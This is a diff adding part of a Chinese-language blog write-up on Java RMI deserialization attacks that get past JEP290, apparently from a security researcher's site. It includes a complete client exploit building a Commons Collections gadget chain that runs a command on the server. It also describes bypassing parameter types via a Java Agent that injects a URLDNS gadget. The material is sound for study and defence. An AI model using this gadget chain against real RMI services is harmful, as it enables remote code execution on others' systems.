@@ -121,3 +121,108 @@ JEP290只是为RMI注册表和RMI分布式垃圾收集器提供了相应的内�
 
 先把接口都新增一个sayPayload的方法,参数都是Object类型的
 
+正常来说，查询的RMI服务端接口方法中包含object类。那就可以通过发送序列化对象数据，造成反序列化。定义如下的HelloInterface接口
+
+
+    import java.rmi.Remote;
+    ​
+    public interface HelloInterface extends java.rmi.Remote {
+    public String sayHello(String from) throws java.rmi.RemoteException;
+    public Object sayPayload(Object from) throws java.rmi.RemoteException;
+    }
+
+RMI服务端编写HelloImpl实现sayPayload方法
+
+	import java.rmi.server.UnicastRemoteObject;
+	​
+	public class HelloImpl extends UnicastRemoteObject implements HelloInterface {
+	    public HelloImpl() throws java.rmi.RemoteException {
+	        super();
+	    }
+	​
+	    public String sayHello(String from) throws java.rmi.RemoteException {
+	        System.out.println("Hello from " + from + "!!");
+	        return "sayHello";
+	    }
+	​
+	    public Object sayPayload(Object from) throws java.rmi.RemoteException {
+	        System.out.println("Hello from " + from + "!!");
+	        return null;
+	    }
+	}
+
+客户端在调用这个sayPayload方法时直接传payload看下
+
+	public class HelloClient {
+	    public static void main(String[] args) {
+	        try {
+	            Registry registry = LocateRegistry.getRegistry(1099);
+	            HelloInterface hello = (HelloInterface) registry.lookup("hello1");
+	​
+	            Transformer[] transformers = new Transformer[]{
+	                    new ConstantTransformer(Runtime.class),
+	                    new InvokerTransformer("getMethod",
+	                            new Class[]{String.class, Class[].class},
+	                            new Object[]{"getRuntime", new Class[0]}),
+	                    new InvokerTransformer("invoke",
+	                            new Class[]{Object.class, Object[].class},
+	                            new Object[]{null, new Object[0]}),
+	                    new InvokerTransformer("exec",
+	                            new Class[]{String.class},
+	                            new Object[]{"calc.exe"})
+	            };
+	            Transformer transformerChain = new ChainedTransformer(transformers);
+	            Map innerMap = new HashMap();
+	            Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+	            TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+	            BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
+	            Field valfield = poc.getClass().getDeclaredField("val");
+	            valfield.setAccessible(true);
+	            valfield.set(poc, entry);
+	            
+	            hello.sayPayload(poc);
+	        } catch (Exception e) {
+	            e.printStackTrace();
+	        }
+	    }
+	}
+
+
+执行后服务端计算器直接弹出,如果把这个payload作为sayPayload方法的返回值 客户端计算器也会弹出。
+
+![3.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/3.png)
+
+看下反序列化的地方
+
+sun.rmi.server.UnicastRef#marshalValue
+
+
+在实际使用场景很少有参数是Object类型的,而攻击者可以完全操作客户端,因此可以用恶意对象替换从Object类派生的参数(例如String),具体有如下四种bypass的思路
+
+- 将java.rmi包的代码复制到新包，并在新包中修改相应的代码
+- 将调试器附加到正在运行的客户端，并在序列化之前替换这些对象
+- 使用诸如Javassist这样的工具修改字节码
+- 通过实现代理替换网络流上已经序列化的对象
+
+目前主要绕过的方法是使用第三种，通过Java Agent的技术来实现对字节码的修改。对RMI 服务接口进行查询时，将原本不是object类型的参数替换为object类型，发送至invokeRemoteMethod的第三个参数
+
+![5.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/5.png)
+
+这里面直接使用 `https://github.com/Afant1/RemoteObjectInvocationHandler` 中代码。通过修改字节码，将invokeRemoteMethod处的参数进行修改替换为项目中编写的URLDNS类 ——> getObject ——> url
+
+![6.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/6.png)
+
+
+启动RMI server
+
+![7.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/7.png)
+
+通过mvn package打包，运行RmiClient前，VM options参数填写:-javaagent:C:\xx\xx\xx\xx\xx\rasp-1.0-SNAPSHOT.jar
+
+![8.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/8.png)
+
+在invokeRemoteMethod位置下断点，debug后查看参数情况如下，传入的参数已被修改为URLDNS gadget
+
+![4.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/4.png)
+
+
